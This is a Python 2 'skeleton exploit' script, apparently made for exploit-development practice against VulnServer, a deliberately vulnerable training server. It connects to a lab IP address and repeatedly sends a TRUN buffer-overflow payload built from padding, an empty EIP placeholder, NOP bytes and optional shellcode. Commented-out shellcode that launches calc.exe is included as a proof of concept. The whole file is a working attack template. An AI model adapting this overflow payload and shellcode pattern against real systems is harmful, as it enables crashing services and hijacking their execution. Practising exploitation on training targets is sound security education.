#!/usr/bin/env python
#VulnServer Skeleton Exploit
#Author: @HackerOnTwoWheels
import socket
import struct

#Target
host="192.168.56.101"
port=9999

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect((host,port))
	print "\n[*] Successfully connected to VulnServer at: " + host + " [*]"
except:
	print "\n[!]Vulnserver cannot be reached at: " + host + " [!]"
	print "\n[!]Please check if vulnserver is running on target host [!]"

#Payload

buffsize = 2016
header = "TRUN "
padding = "A"*5000
eip = ""
nops = "\x90" * 4
buf = "" 

#shell code to open calc.exe as PoC
#buf = "\x31\xC9"                  # xor ecx,ecx
#buf += "\x51"                     # push ecx
#buf += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
#buf += "\x54"                     # push dword ptr esp
#buf += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
#buf += "\xFF\xD0"                 # call eax


payload = header + padding + eip + nops + buf
payload += "C" * (buffsize - len(payload))

#Send Payload and Exploit
count = 0
print "\n[*] Sending Payload to target [*]\n"
while True:
	count += 1
	s.send(payload)
	print "[*] Sent: " + str(len(payload)) + " bytes " + str(count) + " times[*]\n"
s.close()

